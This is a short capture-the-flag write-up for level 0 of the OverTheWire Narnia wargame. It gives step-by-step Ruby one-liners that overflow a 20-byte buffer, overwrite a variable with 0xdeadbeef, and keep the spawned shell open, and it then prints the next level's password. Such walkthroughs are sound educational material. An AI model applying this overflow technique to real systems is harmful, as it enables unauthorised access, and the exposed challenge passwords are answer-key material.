# [Narnia](http://overthewire.org/wargames/narnia/)

For all levels `ssh narnia[level]@narnia.labs.overthewire.org -p 2226`

## Narnia 0

**user:** *narnia0*  
**pass:** *narnia0*

Looking at the source code for "/narnia/narnia0.c" we see that we have two variables.
`val` stores "0x41414141" and `buf` is allocated 20 characters.
The program then reads our input into `buf` but allows for 24 characters.
Those extra four characters should be enough to override `val`

This is a basic example of a buffer overflow. So if we run the below script:

`ruby -e 'puts "A"*20 + "BBBB"' | ./narnia0`

We see that `val` was successfuly overwritten. Now we need to put "Oxdeadbeef" into val instead of just four Bs.

`ruby -e 'puts "A"*20 + "\xde\xad\xbe\xef"' | ./narnia0`

Strange... our input is reversed. Thats because the memory is little-endian and stores things backwards. Lets tweak our script

`ruby -e 'puts "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0`

So we got `val` to correctly be "0xdeadbeef" but the program just terminated. Looking back at the source code, we were supposed to get a shell.
Well the program successfully ran and then the shell closed immediately.
We need a way to keep the shell open.

`(ruby -e 'puts "A"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0`

Perfect. We got a shell as narnia1!

`cat /etc/narnia_pass/narnia1`

Password for *narnia1*: **efeidiedae**

## Narnia 1

**user:** *narnia1*  
**pass:** *efeidiedae*
